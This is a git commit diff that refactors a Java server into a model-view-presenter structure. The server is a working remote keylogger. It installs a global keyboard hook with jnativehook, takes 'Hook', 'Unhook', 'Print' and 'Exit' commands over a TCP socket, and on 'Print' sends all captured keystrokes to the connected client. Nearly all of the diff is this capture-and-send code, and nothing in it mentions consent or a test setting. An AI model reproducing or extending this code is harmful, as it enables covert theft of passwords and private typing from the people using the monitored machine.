189e110951e71ff46e05611c64101a51bde486ff
3n0ch <iamnmt03@gmail.com>
2022-11-17 16:00:54 +0700

    refactor Server code into MVP model

--- Server/src/controller/Controller.java
+++ Server/src/controller/Controller.java
@@ -5,21 +5,23 @@ import java.net.*;
 
 import model.Server;
 import view.Terminal;
-import static model.Server.State.*;
 
 public class Controller {
   private Server server;
   private Terminal terminal;
 
   public Controller(Server server, Terminal terminal) {
-    this.server = server;
     this.terminal = terminal;
+    this.server = server;
+
+    this.server.addController(this);
   } 
 
-  public void run() {
-    while(server.getState() != STOP) {
+  public void start() {
+    server.run();
+  }
 
-
-    }
+  public void handleAction(String action) {
+    terminal.print(action);
   }
 }
--- Server/src/model/Server.java
+++ Server/src/model/Server.java
@@ -7,30 +7,125 @@ import java.util.Scanner;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.GlobalScreen;
 
+import controller.Controller;
+
 public class Server {
-    public static enum State {
+    private enum Status {
+        STOP,
+        SUSPEND,
         RUNNING,
-        LOGGING,
-        STOP
     };
     private ServerSocket serverSock;
     private Socket clientSock;
     private InputStream inputStream;
     private OutputStream outputStream;
     private KeyLogger keyLogger;
-    private State state;
+    private Controller controller;
+    private Status status;
+    private boolean isHooked;
 
     public Server(int port, int backlog) {
+        this.controller = controller;
         createServerSocket(port, backlog);
         keyLogger = new KeyLogger();
-        state = State.RUNNING;
+
+        status = Status.STOP;
+        isHooked = false;
+        
+        // Register NativeHook for KeyLogger
+
+        try {
+            GlobalScreen.registerNativeHook();
+        }
+        catch (NativeHookException ex) {
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+
+            System.exit(1);
+        }
     }
 
-    public State getState() {
-        return state;
+    public void run() {
+        status = Status.RUNNING;
+
+        new Thread(new Runnable() {
+            public void run() {
+                acceptClient();
+
+                while(status == Status.RUNNING) {
+                    byte[] buffer = new byte[128];
+                    try {
+                        inputStream.read(buffer);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                    String action = new String(buffer).trim();
+                    System.out.println(action);
+
+                    switch (action) {
+                        case ("Hook"):
+                        case ("Unhook"):
+                        case ("Print"): {
+                            handleKeyLogging(action);
+                            break;
+                        }
+                        case ("Exit"): {
+                            status = Status.STOP;
+                            break;
+                        }
+                    }
+                }
+
+                cleanup();
+            }
+        }).start();
+
     }
 
-    public void acceptClient() {
+    public void addController(Controller controller) {
+        this.controller = controller;
+    }
+
+    private void handleKeyLogging(String action) {
+        notifyController(action);
+        switch(action) {
+            case ("Hook"): {
+                if (isHooked == false) {
+                    GlobalScreen.addNativeKeyListener(keyLogger);
+                    isHooked = true;
+                }
+                break;
+            }
+            case ("Unhook"): {
+                if (isHooked == true) {
+                    GlobalScreen.removeNativeKeyListener(keyLogger);
+                    keyLogger.clearLogs();
+                    isHooked = false;
+                }
+                break;
+            }
+            case ("Print"): {
+                String out = "";
+                for (int i = 0; i < keyLogger.logs.size(); i++) {
+                    out += keyLogger.logs.get(i);
+                }
+                byte[] tmp = out.getBytes();
+
+                try {
+                    outputStream.write(tmp);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                break;
+            }
+        }
+    }
+
+    private void notifyController(String action) {
+        controller.handleAction(action);
+    }
+
+    private void acceptClient() {
         try {
             clientSock = serverSock.accept();
             inputStream = clientSock.getInputStream();
@@ -50,71 +145,13 @@ public class Server {
         }
     }
 
-
-    // public static void main(String[] args) {
-    //     try {
-    //         try {
-    //             GlobalScreen.registerNativeHook();
-    //         }
-    //         catch (NativeHookException ex) {
-    //             System.err.println("There was a problem registering the native hook.");
-    //             System.err.println(ex.getMessage());
-    //
-    //             System.exit(1);
-    //         }
-    //
-    //
-    //         Scanner sc = new Scanner(System.in);
-    //
-    //         String command = "";
-    //         boolean isHooked = false;
-    //
-    //         while (!command.trim().equals("Exit"))
-    //         {
-    //             byte[] buffer = new byte[100];
-    //             is.read(buffer);
-    //             command = new String(buffer);
-    //             command = command.trim();
-    //
-    //             switch(command) {
-    //                 case "Hook":
-    //                     if (isHooked == false) {
-    //                         GlobalScreen.addNativeKeyListener(kl);
-    //                         System.out.println("Add native key listener");
-    //                         isHooked = true;
-    //                     }
-    //                     break;
-    //                 case "Unhook":
-    //                     if (isHooked == true) {
-    //                         GlobalScreen.removeNativeKeyListener(kl);
-    //                         System.out.println("Remove native key listener");
-    //                         kl.clearLogs();
-    //                         isHooked = false;
-    //                     }
-    //                     break;
-    //                 case "Print":
-    //                     System.out.println("laksdjf");
-    //                     String out = "";
-    //                     for (int i = 0; i < kl.logs.size(); i++) {
-    //                         out += kl.logs.get(i);
-    //                     }
-    //                     byte[] tmp = out.getBytes();
-    //                     os.write(tmp);
-    //                     break;
-    //             }
-    //         }
-    //
-    //         try {
-    //             GlobalScreen.unregisterNativeHook();
-    //         } catch (NativeHookException nativeHookException) {
-    //             nativeHookException.printStackTrace();
-    //         }
-    //
-    //         sock.close();
-    //         System.out.println("Socket closed");
-    //     }
-    //     catch (IOException ioE) {
-    //         ioE.printStackTrace();
-    //     }
-    // }
+    private void cleanup() {
+        try {
+            GlobalScreen.unregisterNativeHook();
+            serverSock.close();
+            clientSock.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 }
